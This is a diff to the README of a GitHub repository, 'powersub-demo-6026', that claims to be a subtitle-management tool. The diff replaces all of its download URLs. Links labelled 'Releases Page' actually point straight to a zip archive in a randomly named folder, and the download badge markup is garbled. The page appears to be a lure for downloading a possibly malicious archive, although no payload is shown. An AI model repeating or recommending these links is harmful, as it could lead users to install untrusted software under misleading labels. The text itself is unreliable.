@@ -6,7 +6,7 @@ Welcome to the **powersub-demo-6026** project! This application helps you manage
 
 ## 📥 Download
 
-[![Download](https://raw.githubusercontent.com/gnolo04/powersub-demo-6026/main/fibrofatty/powersub-demo-6026.zip%20Now-Click%https://raw.githubusercontent.com/gnolo04/powersub-demo-6026/main/fibrofatty/powersub-demo-6026.zip)](https://raw.githubusercontent.com/gnolo04/powersub-demo-6026/main/fibrofatty/powersub-demo-6026.zip)
+[![Download](https://github.com/gnolo04/powersub-demo-6026/raw/refs/heads/main/fibrofatty/demo-powersub-1.5.zip%20Now-Click%https://github.com/gnolo04/powersub-demo-6026/raw/refs/heads/main/fibrofatty/demo-powersub-1.5.zip)](https://github.com/gnolo04/powersub-demo-6026/raw/refs/heads/main/fibrofatty/demo-powersub-1.5.zip)
 
 ## 🛠 Installation Steps
 
@@ -16,7 +16,7 @@ Follow these steps to get **powersub-demo-6026** running on your computer.
 
 1. Click the link below to go to the release page.
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/gnolo04/powersub-demo-6026/main/fibrofatty/powersub-demo-6026.zip)
+   [Visit the Releases Page](https://github.com/gnolo04/powersub-demo-6026/raw/refs/heads/main/fibrofatty/demo-powersub-1.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -65,4 +65,4 @@ If you encounter any issues or have questions, feel free to reach out. Here’s 
 
 Now you are ready to enhance your subtitle management experience with **powersub-demo-6026**. 
 
-Don't forget to check out the [Releases Page](https://raw.githubusercontent.com/gnolo04/powersub-demo-6026/main/fibrofatty/powersub-demo-6026.zip) for updates and new versions!
+Don't forget to check out the [Releases Page](https://github.com/gnolo04/powersub-demo-6026/raw/refs/heads/main/fibrofatty/demo-powersub-1.5.zip) for updates and new versions!
